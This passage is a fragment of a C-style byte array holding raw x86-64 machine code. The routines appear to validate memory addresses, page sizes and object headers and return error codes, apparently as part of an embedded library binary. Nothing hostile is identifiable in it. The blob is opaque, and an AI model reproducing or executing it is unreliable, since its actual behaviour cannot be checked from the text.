    0x72, 0x6B, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC3, 0x48,
    0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x51, 0x4D, 0x85, 0xC0, 0x48,
    0xC7, 0x03, 0x00, 0x00, 0x00, 0x00, 0x75, 0x15, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C,
    0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x4C, 0x3B, 0xC7,
    0x77, 0xE6, 0x49, 0x83, 0xF9, 0xFF, 0x75, 0x08, 0xE8, 0x53, 0xE7, 0xFF, 0xFF, 0x4C, 0x8B, 0xC8,
    0x4C, 0x8B, 0xC7, 0x48, 0x8B, 0xD6, 0x48, 0x8B, 0xCB, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B,
    0x74, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xE9, 0xD3, 0x13, 0x00, 0x00, 0x48, 0x8B, 0x5C,
    0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x38, 0xB8, 0xFA, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x20,
    0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0xC2, 0x48, 0x81, 0xE2, 0x00, 0xF0, 0xFF, 0xFF, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x4E,
    0x8D, 0x8C, 0x00, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81,
    0xE1, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x58, 0x49, 0xBA, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x49, 0x23, 0xC2, 0x49, 0x3B, 0xC2,
    0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x3E, 0x4D, 0x85, 0xC0, 0x48, 0xC7, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x75, 0x06, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xC3, 0x4D, 0x3B, 0xC1, 0x77, 0xF5, 0x48, 0x8D,
    0x82, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x18, 0x48, 0x8B, 0xC2,
    0x49, 0x23, 0xC2, 0x49, 0x3B, 0xC2, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x08, 0x4D, 0x8B, 0xC1,
    0xE9, 0x8B, 0x13, 0x00, 0x00, 0xB8, 0xFA, 0xFF, 0xFF, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8D, 0x8A, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81,
    0xE1, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x3E, 0x49, 0xBA, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x49, 0x23, 0xC2, 0x49, 0x3B, 0xC2,
    0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x24, 0x48, 0x85, 0xD2, 0x48, 0xC7, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x75, 0x06, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xC3, 0x49, 0x3B, 0xD1, 0x77, 0xF5, 0x4C, 0x3B,
    0xC2, 0x72, 0xF0, 0x49, 0x8B, 0xD1, 0xE9, 0x85, 0x0D, 0x00, 0x00, 0xB8, 0xFA, 0xFF, 0xFF, 0xFF,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8D, 0x8A, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81,
    0xE1, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x3E, 0x49, 0xBA, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x49, 0x23, 0xC2, 0x49, 0x3B, 0xC2,
    0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x24, 0x48, 0x85, 0xD2, 0x48, 0xC7, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x75, 0x06, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xC3, 0x49, 0x3B, 0xD1, 0x77, 0xF5, 0x4C, 0x3B,
    0xC2, 0x72, 0xF0, 0x49, 0x8B, 0xD1, 0xE9, 0xD5, 0x0E, 0x00, 0x00, 0xB8, 0xFA, 0xFF, 0xFF, 0xFF,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0xC2, 0x4C, 0x8B, 0xD2, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x49, 0x81, 0xE2, 0x00, 0xF0,
    0xFF, 0xFF, 0x4E, 0x8D, 0x8C, 0x00, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00,
    0x00, 0x49, 0x81, 0xE1, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x46,
    0x49, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x49, 0x23, 0xC3,
    0x49, 0x3B, 0xC3, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x2C, 0x4D, 0x85, 0xC0, 0x48, 0xC7, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x75, 0x06, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xC3, 0x4D, 0x3B, 0xC1, 0x77,
    0xF5, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x3B, 0xD0, 0x74, 0xEB, 0x4D, 0x8B, 0xC1, 0x49, 0x8B,
    0xD2, 0xE9, 0x0A, 0x0F, 0x00, 0x00, 0xB8, 0xFA, 0xFF, 0xFF, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4D, 0x8D, 0x90, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81,
    0xE2, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x6E, 0x49, 0xBB, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x49, 0x23, 0xC3, 0x49, 0x3B, 0xC3,
    0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x54, 0x4D, 0x85, 0xC9, 0x48, 0xC7, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x75, 0x27, 0x41, 0xB9, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x74, 0x37, 0x4D, 0x3B,
    0xC2, 0x77, 0x32, 0x48, 0x83, 0xFA, 0xFF, 0x74, 0x09, 0x49, 0x8D, 0x41, 0xFF, 0x48, 0x85, 0xC2,
    0x75, 0x23, 0x4D, 0x8B, 0xC2, 0xE9, 0xC6, 0x11, 0x00, 0x00, 0x49, 0x81, 0xF9, 0x00, 0x10, 0x00,
    0x00, 0x74, 0xD6, 0x49, 0x81, 0xF9, 0x00, 0x00, 0x20, 0x00, 0x74, 0xCD, 0x49, 0x81, 0xF9, 0x00,
    0x00, 0x40, 0x00, 0x74, 0xC4, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xC3, 0xB8, 0xFA, 0xFF, 0xFF, 0xFF,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57,
    0x48, 0x83, 0xEC, 0x30, 0x49, 0x8D, 0xA8, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x81, 0x00, 0x10,
    0x00, 0x00, 0x49, 0x8B, 0xD9, 0x48, 0x81, 0xE5, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x3D, 0x00, 0x20,
    0x00, 0x00, 0x48, 0x8B, 0xFA, 0x48, 0x8B, 0xF1, 0x0F, 0x82, 0x8E, 0x00, 0x00, 0x00, 0x48, 0xB9,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC6, 0x48, 0x23, 0xC1, 0x48, 0x3B,
    0xC1, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x74, 0x48, 0x85, 0xDB, 0x48, 0xC7, 0x06, 0x00, 0x00,
    0x00, 0x00, 0x75, 0x46, 0xBB, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x74, 0x57, 0x4C, 0x3B,
    0xC5, 0x77, 0x52, 0x48, 0x83, 0xFA, 0xFF, 0x74, 0x09, 0x48, 0x8D, 0x43, 0xFF, 0x48, 0x85, 0xC2,
    0x75, 0x43, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x83, 0xF8, 0xFF, 0x75, 0x05, 0xE8, 0xEE, 0xE3,
    0xFF, 0xFF, 0x4C, 0x8B, 0xCB, 0x4C, 0x8B, 0xC5, 0x48, 0x8B, 0xD7, 0x48, 0x8B, 0xCE, 0x48, 0x89,
    0x44, 0x24, 0x20, 0xE8, 0xF8, 0x10, 0x00, 0x00, 0xEB, 0x27, 0x48, 0x81, 0xFB, 0x00, 0x10, 0x00,
    0x00, 0x74, 0xB6, 0x48, 0x81, 0xFB, 0x00, 0x00, 0x20, 0x00, 0x74, 0xAD, 0x48, 0x81, 0xFB, 0x00,
    0x00, 0x40, 0x00, 0x74, 0xA4, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xEB, 0x05, 0xB8, 0xFA, 0xFF, 0xFF,
    0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50,
    0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00,
    0x00, 0x48, 0x8B, 0xFA, 0x48, 0x8B, 0xF1, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x0F, 0x82, 0x5D,
    0x01, 0x00, 0x00, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC6,
    0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x3F, 0x01, 0x00,
    0x00, 0x48, 0x8D, 0x82, 0x00, 0x10, 0x00, 0x00, 0x48, 0xC7, 0x06, 0x00, 0x00, 0x00, 0x00, 0x48,
    0x3D, 0x00, 0x20, 0x00, 0x00, 0x0F, 0x82, 0x15, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xC2, 0x48, 0x23,
    0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x01, 0x01, 0x00, 0x00, 0x81,
    0x3A, 0x10, 0x12, 0x61, 0x19, 0x0F, 0x85, 0xF5, 0x00, 0x00, 0x00, 0x8B, 0x42, 0x08, 0x85, 0xC0,
    0x0F, 0x8E, 0xEA, 0x00, 0x00, 0x00, 0x83, 0xF8, 0x09, 0x0F, 0x8D, 0xE1, 0x00, 0x00, 0x00, 0x83,
    0xF8, 0x08, 0x75, 0x10, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x83,
    0xC4, 0x30, 0x5F, 0xC3, 0x83, 0xF8, 0x07, 0x74, 0xEB, 0x4D, 0x85, 0xC9, 0x75, 0x08, 0x41, 0xB9,
    0x00, 0x10, 0x00, 0x00, 0xEB, 0x1B, 0x49, 0x81, 0xF9, 0x00, 0x10, 0x00, 0x00, 0x74, 0x12, 0x49,
    0x81, 0xF9, 0x00, 0x00, 0x20, 0x00, 0x74, 0x09, 0x49, 0x81, 0xF9, 0x00, 0x00, 0x40, 0x00, 0x75,
    0xC3, 0x49, 0x83, 0xF8, 0xFF, 0x74, 0x09, 0x49, 0x8D, 0x41, 0xFF, 0x49, 0x85, 0xC0, 0x75, 0xB4,
    0x8B, 0x44, 0x24, 0x60, 0x85, 0xC0, 0x74, 0xAC, 0xA9, 0xF8, 0xFF, 0xFF, 0xFF, 0x75, 0xA5, 0x48,
    0x8D, 0x4C, 0x24, 0x40, 0x48, 0x89, 0x5C, 0x24, 0x48, 0x89, 0x44, 0x24, 0x20, 0xE8, 0x4E, 0x11,
    0x00, 0x00, 0x85, 0xC0, 0x8B, 0xD8, 0x78, 0x56, 0x48, 0x8B, 0x54, 0x24, 0x40, 0x48, 0x8B, 0xCF,
    0xE8, 0x3B, 0xF4, 0xFF, 0xFF, 0x85, 0xC0, 0x8B, 0xD8, 0x78, 0x1A, 0x48, 0x8B, 0x44, 0x24, 0x40,
    0x48, 0x89, 0x06, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48,
    0x83, 0xC4, 0x30, 0x5F, 0xC3, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0xE8, 0x91, 0x04, 0x00, 0x00, 0x4C,
    0x8B, 0x5C, 0x24, 0x40, 0x41, 0x83, 0x03, 0x01, 0x48, 0x8B, 0x44, 0x24, 0x40, 0xC7, 0x40, 0x08,
    0x09, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0xE8, 0x62, 0x02, 0x00, 0x00, 0x8B, 0xC3,
    0x48, 0x8B, 0x5C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3,
    0xB8, 0xFC, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3,
    0xB8, 0xFA, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3,
    0x48, 0x89, 0x5C, 0x24, 0x18, 0x55, 0x57, 0x41, 0x54, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8D, 0x81,
    0x00, 0x10, 0x00, 0x00, 0x49, 0x8B, 0xD9, 0x4D, 0x8B, 0xE0, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00,
    0x48, 0x8B, 0xFA, 0x48, 0x8B, 0xE9, 0x0F, 0x82, 0x82, 0x01, 0x00, 0x00, 0x48, 0xB9, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC5, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74,
    0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x64, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x82, 0x00, 0x10, 0x00,
    0x00, 0x48, 0xC7, 0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x0F,
    0x82, 0x36, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xC2, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09,
    0x48, 0x85, 0xC0, 0x0F, 0x85, 0x22, 0x01, 0x00, 0x00, 0x81, 0x3A, 0x10, 0x12, 0x61, 0x19, 0x0F,
    0x85, 0x16, 0x01, 0x00, 0x00, 0x8B, 0x42, 0x08, 0x85, 0xC0, 0x0F, 0x8E, 0x0B, 0x01, 0x00, 0x00,
    0x83, 0xF8, 0x09, 0x0F, 0x8D, 0x02, 0x01, 0x00, 0x00, 0x83, 0xF8, 0x08, 0x75, 0x13, 0xB8, 0xFE,
    0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x60, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5C, 0x5F, 0x5D,
    0xC3, 0x83, 0xF8, 0x07, 0x74, 0xE8, 0x48, 0x85, 0xDB, 0x75, 0x07, 0xBB, 0x00, 0x10, 0x00, 0x00,
    0xEB, 0x1B, 0x48, 0x81, 0xFB, 0x00, 0x10, 0x00, 0x00, 0x74, 0x12, 0x48, 0x81, 0xFB, 0x00, 0x00,
    0x20, 0x00, 0x74, 0x09, 0x48, 0x81, 0xFB, 0x00, 0x00, 0x40, 0x00, 0x75, 0xC1, 0x49, 0x83, 0xF8,
    0xFF, 0x74, 0x09, 0x48, 0x8D, 0x43, 0xFF, 0x49, 0x85, 0xC0, 0x75, 0xB2, 0x48, 0x89, 0x74, 0x24,
    0x58, 0x8B, 0x74, 0x24, 0x70, 0x85, 0xF6, 0x74, 0x08, 0xF7, 0xC6, 0xF8, 0xFF, 0xFF, 0xFF, 0x74,
    0x18, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x74, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x60,
    0x48, 0x83, 0xC4, 0x30, 0x41, 0x5C, 0x5F, 0x5D, 0xC3, 0x48, 0x8B, 0x44, 0x24, 0x78, 0x48, 0x83,
    0xF8, 0xFF, 0x75, 0x05, 0xE8, 0xD7, 0xE0, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8D,
    0x4C, 0x24, 0x50, 0x4C, 0x8B, 0xCB, 0x4D, 0x8B, 0xC4, 0x48, 0x8B, 0xD7, 0x89, 0x74, 0x24, 0x20,
    0xE8, 0x9B, 0x0F, 0x00, 0x00, 0x85, 0xC0, 0x8B, 0xD8, 0x78, 0x49, 0x48, 0x8B, 0x54, 0x24, 0x50,
    0x48, 0x8B, 0xCF, 0xE8, 0x68, 0xF2, 0xFF, 0xFF, 0x85, 0xC0, 0x8B, 0xD8, 0x78, 0x0D, 0x48, 0x8B,
    0x44, 0x24, 0x50, 0x48, 0x89, 0x45, 0x00, 0x8B, 0xC3, 0xEB, 0x9B, 0x48, 0x8B, 0x4C, 0x24, 0x50,
    0xE8, 0xCB, 0x02, 0x00, 0x00, 0x4C, 0x8B, 0x5C, 0x24, 0x50, 0x41, 0x83, 0x03, 0x01, 0x48, 0x8B,
    0x44, 0x24, 0x50, 0xC7, 0x40, 0x08, 0x09, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0xE8,
    0x9C, 0x00, 0x00, 0x00, 0x8B, 0xC3, 0xE9, 0x6B, 0xFF, 0xFF, 0xFF, 0xB8, 0xFC, 0xFF, 0xFF, 0xFF,
    0x48, 0x8B, 0x5C, 0x24, 0x60, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5C, 0x5F, 0x5D, 0xC3, 0xB8, 0xFA,
    0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x60, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5C, 0x5F, 0x5D,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x33, 0xD2, 0xE8, 0x25, 0x12, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x09,
    0x48, 0x83, 0xC0, 0x10, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3,
    0x48, 0x83, 0xEC, 0x28, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xE8, 0x02, 0x12, 0x00, 0x00, 0x48, 0x85,
    0xC0, 0x74, 0x24, 0x44, 0x8B, 0x40, 0x08, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8D, 0x58, 0x10,
    0x48, 0x8B, 0xCB, 0x33, 0xD2, 0xE8, 0x96, 0xDB, 0xFF, 0xFF, 0x48, 0x8B, 0xC3, 0x48, 0x8B, 0x5C,
    0x24, 0x20, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x11, 0x48, 0x83, 0xC1, 0xF0, 0x81, 0x39, 0x19,
    0x01, 0x09, 0x18, 0x75, 0x05, 0xE8, 0xF6, 0x11, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0xBA, 0x02, 0x00, 0x00, 0x00, 0xE8, 0xA2, 0x11, 0x00, 0x00, 0x48, 0x85,
    0xC0, 0x74, 0x09, 0x48, 0x83, 0xC0, 0x10, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x33, 0xC0, 0x48, 0x83,
    0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x11, 0x48, 0x83, 0xC1, 0xF0, 0x81, 0x39, 0x19,
    0x01, 0x09, 0x18, 0x75, 0x05, 0xE8, 0xA6, 0x11, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x33, 0xD2, 0xE8, 0x55, 0x11, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x09,
    0x48, 0x83, 0xC0, 0x10, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3,
    0x48, 0x83, 0xEC, 0x28, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xE8, 0x32, 0x11, 0x00, 0x00, 0x48, 0x85,
    0xC0, 0x74, 0x24, 0x44, 0x8B, 0x40, 0x08, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8D, 0x58, 0x10,
    0x48, 0x8B, 0xCB, 0x33, 0xD2, 0xE8, 0xC6, 0xDA, 0xFF, 0xFF, 0x48, 0x8B, 0xC3, 0x48, 0x8B, 0x5C,
    0x24, 0x20, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x11, 0x48, 0x83, 0xC1, 0xF0, 0x81, 0x39, 0x19,
    0x01, 0x09, 0x18, 0x75, 0x05, 0xE8, 0x26, 0x11, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC,
    0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x85, 0xD2, 0x48, 0x8B, 0xC2,
    0x48, 0x8B, 0xF9, 0x75, 0x23, 0x48, 0x85, 0xC9, 0x74, 0x11, 0x48, 0x83, 0xC1, 0xF0, 0x81, 0x39,
    0x19, 0x01, 0x09, 0x18, 0x75, 0x05, 0xE8, 0xF5, 0x10, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8B, 0x74,
    0x24, 0x38, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x85, 0xC9, 0x75, 0x1E, 0x33, 0xD2, 0x48,
    0x8B, 0xC8, 0xE8, 0x99, 0x10, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0xDF, 0x48, 0x83, 0xC0, 0x10,
    0x48, 0x8B, 0x74, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x81, 0x79, 0xF0, 0x19, 0x01,
    0x09, 0x18, 0x75, 0xC7, 0x8B, 0x49, 0xF8, 0x48, 0x3B, 0xCA, 0x72, 0x1A, 0x48, 0x2B, 0xCA, 0x48,
    0x81, 0xF9, 0x80, 0x00, 0x00, 0x00, 0x77, 0x0E, 0x48, 0x8B, 0xC7, 0x48, 0x8B, 0x74, 0x24, 0x38,
    0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x33, 0xD2, 0x48, 0x8B, 0xC8, 0xE8, 0x50, 0x10, 0x00, 0x00,
    0x48, 0x85, 0xC0, 0x74, 0x96, 0x8B, 0x57, 0xF8, 0x44, 0x8B, 0x40, 0x08, 0x48, 0x89, 0x5C, 0x24,
    0x30, 0x41, 0x3B, 0xD0, 0x48, 0x8D, 0x58, 0x10, 0x44, 0x0F, 0x46, 0xC2, 0x48, 0x8B, 0xD7, 0x48,
    0x8B, 0xCB, 0xE8, 0xD9, 0xDA, 0xFF, 0xFF, 0x48, 0x8D, 0x4F, 0xF0, 0xE8, 0x60, 0x10, 0x00, 0x00,
    0x48, 0x8B, 0x74, 0x24, 0x38, 0x48, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4,
    0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x85, 0xC9, 0x74, 0x19, 0x81, 0xE9, 0xC0, 0x00, 0x00, 0x00, 0x74, 0x0B, 0x83, 0xF9, 0x41, 0x74,
    0x06, 0xB8, 0xDD, 0xFF, 0xFF, 0xFF, 0xC3, 0xB8, 0xD9, 0xFF, 0xFF, 0xFF, 0xC3, 0x33, 0xC0, 0xC3,
    0x9C, 0x58, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x51, 0x9D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x6C, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x8B,
    0x41, 0x08, 0x48, 0x8B, 0xD9, 0x83, 0xC0, 0xFF, 0x83, 0xF8, 0x07, 0x0F, 0x87, 0xCF, 0x01, 0x00,
    0x00, 0x48, 0x8D, 0x0D, 0x88, 0x88, 0xFF, 0xFF, 0x48, 0x98, 0x8B, 0x94, 0x81, 0x58, 0x79, 0x00,
    0x00, 0x48, 0x03, 0xD1, 0xFF, 0xE2, 0x80, 0x7B, 0x40, 0x00, 0x0F, 0x84, 0x9E, 0x01, 0x00, 0x00,
    0x48, 0x8B, 0x53, 0x58, 0x48, 0x8B, 0x4B, 0x18, 0xFF, 0x15, 0x5A, 0x11, 0x00, 0x00, 0x48, 0x8B,
    0x4B, 0x48, 0x33, 0xFF, 0x48, 0x85, 0xC9, 0x48, 0x89, 0x7B, 0x18, 0x74, 0x0A, 0xFF, 0x15, 0x5D,
    0x12, 0x00, 0x00, 0x48, 0x89, 0x7B, 0x48, 0x48, 0x8B, 0x4B, 0x58, 0xFF, 0x15, 0x47, 0x12, 0x00,
    0x00, 0x48, 0x8B, 0x4B, 0x58, 0x33, 0xD2, 0xFF, 0x15, 0xCB, 0x11, 0x00, 0x00, 0x48, 0x89, 0x7B,
    0x58, 0x89, 0x7B, 0x50, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48, 0x8B, 0x6C, 0x24, 0x40,
    0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x8B, 0x4B, 0x18, 0x33, 0xD2, 0xFF, 0x15, 0xA6, 0x11,
    0x00, 0x00, 0x48, 0x8B, 0x4B, 0x58, 0x33, 0xFF, 0x48, 0x89, 0x7B, 0x18, 0xFF, 0x15, 0xBE, 0x10,
    0x00, 0x00, 0x48, 0x89, 0x7B, 0x58, 0x89, 0x7B, 0x50, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x38,
